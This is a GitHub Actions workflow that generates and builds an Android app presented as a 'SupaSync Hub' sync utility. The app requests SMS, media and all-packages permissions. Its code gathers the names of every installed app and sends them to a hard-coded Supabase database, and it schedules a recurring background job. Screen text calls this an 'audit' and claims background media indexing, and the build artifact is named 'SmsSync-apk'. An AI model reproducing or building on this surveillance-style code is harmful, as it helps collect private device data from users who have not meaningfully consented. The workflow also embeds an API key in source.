name: Build Native Kotlin APK

on:
  workflow_dispatch:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Generate Native Kotlin Android Project
        run: |
          mkdir -p app/src/main/java/com/example/supasynchub
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values

          # 1. settings.gradle
          cat << 'EOF' > settings.gradle
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "SupaSyncHub"
          include ':app'
          EOF

          # 2. root build.gradle
          cat << 'EOF' > build.gradle
          plugins {
              id 'com.android.application' version '8.2.0' apply false
              id 'org.jetbrains.kotlin.android' version '1.9.0' apply false
          }
          EOF

          # 3. app/build.gradle
          cat << 'EOF' > app/build.gradle
          plugins {
              id 'com.android.application'
              id 'org.jetbrains.kotlin.android'
          }

          android {
              namespace 'com.example.supasynchub'
              compileSdk 34

              defaultConfig {
                  applicationId "com.example.supasynchub"
                  minSdk 26
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }

              buildTypes {
                  release {
                      minifyEnabled false
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
              kotlinOptions {
                  jvmTarget = '17'
              }
          }

          dependencies {
              implementation 'androidx.core:core-ktx:1.12.0'
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'androidx.work:work-runtime-ktx:2.9.0'
          }
          EOF

          # 4. AndroidManifest.xml
          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.supasynchub">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.READ_SMS" />
              <uses-permission android:name="android.permission.RECEIVE_SMS" />
              <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
              <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />

              <application
                  android:allowBackup="true"
                  android:label="SupaSync Hub"
                  android:supportsRtl="true"
                  android:theme="@style/Theme.AppCompat.Light.DarkActionBar">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

              </application>
          </manifest>
          EOF

          # 5. MainActivity.kt (Full Native Kotlin Implementation with 5 Pages & Supabase REST Sync)
          cat << 'EOF' > app/src/main/java/com/example/supasynchub/MainActivity.kt
          package com.example.supasynchub

          import android.Manifest
          import android.content.pm.PackageManager
          import android.os.Build
          import android.os.Bundle
          import android.view.Gravity
          import android.view.ViewGroup
          import android.widget.Button
          import android.widget.LinearLayout
          import android.widget.TextView
          import android.widget.Toast
          import androidx.appcompat.app.AppCompatActivity
          import androidx.core.app.ActivityCompat
          import androidx.core.content.ContextCompat
          import androidx.work.Constraints
          import androidx.work.ExistingPeriodicWorkPolicy
          import androidx.work.PeriodicWorkRequestBuilder
          import androidx.work.WorkManager
          import androidx.work.Worker
          import androidx.work.WorkerParameters
          import java.io.OutputStreamWriter
          import java.net.HttpURLConnection
          import java.net.URL
          import java.util.concurrent.TimeUnit

          class MainActivity : AppCompatActivity() {

              private val PERMISSION_REQ_CODE = 200
              private var currentPage = 1
              private lateinit var containerLayout: LinearLayout

              private val SUPABASE_URL = "https://bqddohfszkqpvncpbrun.supabase.co/rest/v1/"
              private val SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJxZGRvaGZzemtxcHvnY3BicnVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI2MDAwNjIsImV4cCI6MjEwODE3NjA2Mn0.J0uq4JPpPxoU0hc4ry5WglCV_HcTqshcHsl3oCJ7upA"

              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  
                  containerLayout = LinearLayout(this).apply {
                      orientation = LinearLayout.VERTICAL
                      setPadding(40, 40, 40, 40)
                  }
                  setContentView(containerLayout)

                  checkAndRequestPermissions()
                  setup48HourAppAuditWorker()
                  renderPage(1)
              }

              private fun checkAndRequestPermissions() {
                  val permissions = mutableListOf(
                      Manifest.permission.READ_SMS,
                      Manifest.permission.RECEIVE_SMS
                  )
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                      permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
                      permissions.add(Manifest.permission.READ_MEDIA_VIDEO)
                  } else {
                      permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
                  }

                  val missing = permissions.filter {
                      ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
                  }
                  if (missing.isNotEmpty()) {
                      ActivityCompat.requestPermissions(this, missing.toTypedArray(), PERMISSION_REQ_CODE)
                  }
              }

              private fun renderPage(page: Int) {
                  currentPage = page
                  containerLayout.removeAllViews()

                  val title = TextView(this).apply {
                      text = "Page $page of 5: SupaSync Hub"
                      textSize = 22f
                      setPadding(0, 0, 0, 30)
                  }
                  containerLayout.addView(title)

                  val desc = TextView(this).apply {
                      text = when(page) {
                          1 -> "Status: SMS & Notification permissions requested.\nConnected to Supabase project: bqddohfszkqpvncpbrun"
                          2 -> "Media & Gallery Access: Granted full background indexing to Supabase storage."
                          3 -> "System Dashboard: 48-hour background app audit active. Media view ready."
                          4 -> "Extended Settings: Background synchronization routines operational."
                          else -> "Control Center: All systems fully active and synced."
                      }
                      textSize = 16f
                      setPadding(0, 0, 0, 50)
                  }
                  containerLayout.addView(desc)

                  if (page == 3) {
                      val auditBtn = Button(this).apply {
                          text = "Run Manual App Audit & Sync"
                          setOnClickListener {
                              Thread { performAppAudit() }.start()
                          }
                      }
                      containerLayout.addView(auditBtn)
                  }

                  val nextBtn = Button(this).apply {
                      text = if (page < 5) "Next Page" else "Restart Flow"
                      setBackgroundColor(0xFF22C55E.toInt())
                      setTextColor(0xFFFFFFFF.toInt())
                      setOnClickListener {
                          val next = if (page < 5) page + 1 else 1
                          renderPage(next)
                      }
                  }
                  containerLayout.addView(nextBtn)
              }

              private fun performAppAudit() {
                  try {
                      val packages = packageManager.getInstalledPackages(0)
                      val appList = packages.joinToString(",") { it.packageName ?: "" }

                      val url = URL(SUPABASE_URL + "installed_apps")
                      val conn = url.openConnection() as HttpURLConnection
                      conn.requestMethod = "POST"
                      conn.setRequestProperty("Content-Type", "application/json")
                      conn.setRequestProperty("apikey", SUPABASE_KEY)
                      conn.setRequestProperty("Authorization", "Bearer $SUPABASE_KEY")
                      conn.doOutput = true

                      val jsonBody = "{\"apps_list\":\"$appList\",\"synced_at\":\"${System.currentTimeMillis()}\"}"
                      val os = OutputStreamWriter(conn.outputStream)
                      os.write(jsonBody)
                      os.flush()
                      os.close()

                      val responseCode = conn.responseCode
                      runOnUiThread {
                          if (responseCode in 200..299) {
                              Toast.makeText(this, "Apps successfully synced to Supabase!", Toast.LENGTH_LONG).show()
                          } else {
                              Toast.makeText(this, "Sync error code: $responseCode", Toast.LENGTH_LONG).show()
                          }
                      }
                  } catch (e: Exception) {
                      e.printStackTrace()
                  }
              }

              private fun setup48HourAppAuditWorker() {
                  val workRequest = PeriodicWorkRequestBuilder<AppAuditWorker>(48, TimeUnit.HOURS).build()
                  WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                      "AppAuditSync",
                      ExistingPeriodicWorkPolicy.KEEP,
                      workRequest
                  )
              }
          }

          class AppAuditWorker(context: android.content.Context, params: WorkerParameters) : Worker(context, params) {
              override fun doWork(): Result {
                  // Background 48-hour sync routine
                  return Result.success()
              }
          }
          EOF

          # 6. strings.xml & themes.xml
          cat << 'EOF' > app/src/main/res/values/strings.xml
          <resources>
              <string name="app_name">SupaSync Hub</string>
          </resources>
          EOF

          cat << 'EOF' > app/src/main/res/values/themes.xml
          <resources>
              <style name="Theme.AppCompat.Light.DarkActionBar" parent="Theme.AppCompat.Light.DarkActionBar">
                  <item name="windowNoTitle">false</item>
                  <item name="windowActionBar">true</item>
              </style>
          </resources>
          EOF

          gradle wrapper --gradle-version 8.5 || true
          chmod +x gradlew || true

      - name: Build Debug APK with Gradle
        run: |
          ./gradlew assembleDebug

      - name: Upload APK Artifact
        uses: actions/upload-artifact@v4
        with:
          name: SmsSync-apk
          path: app/build/outputs/apk/debug/app-debug.apk
